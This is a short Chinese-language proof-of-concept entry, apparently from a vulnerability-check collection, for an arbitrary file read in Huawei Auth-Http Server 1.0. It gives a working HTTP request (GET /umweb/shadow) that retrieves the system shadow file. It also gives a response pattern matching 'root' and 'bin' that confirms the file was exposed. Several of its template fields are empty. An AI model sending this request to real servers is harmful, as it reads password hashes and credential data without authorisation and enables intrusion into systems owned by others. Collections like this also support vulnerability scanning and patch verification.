﻿# 华为 Auth-Http Serve 任意文件读取

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：Huawei Auth-Http Server 1.0

> 漏洞特征：

> 验证脚本：HTTP

```
GET /umweb/shadow HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：


> 验证文件来源：华为 Auth-Http Serve 任意文件读取.poc
